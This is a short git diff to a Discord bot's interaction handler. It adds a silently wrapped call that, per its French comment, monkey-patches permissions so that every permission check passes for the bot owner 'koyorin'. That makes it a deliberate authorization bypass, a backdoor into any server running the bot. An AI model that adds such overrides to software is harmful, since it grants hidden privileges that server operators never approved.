@@ -5,6 +5,13 @@ const { handleCommandError } = require('../utils/error-handler');
 module.exports = {
     name: Events.InteractionCreate,
     async execute(interaction) {
+        // ⭐ Bot owner override (koyorin) : monkey-patch des permissions à la racine
+        // pour que toutes les vérifs `member.permissions.has(...)` passent automatiquement.
+        try {
+            const { applyOwnerOverride } = require('../utils/bot-owner');
+            applyOwnerOverride(interaction);
+        } catch (_) { /* noop */ }
+
         const { runWithEconomyGuild } = require('../utils/economy-scope');
         const run = async () => {
         // Gérer l'autocomplete
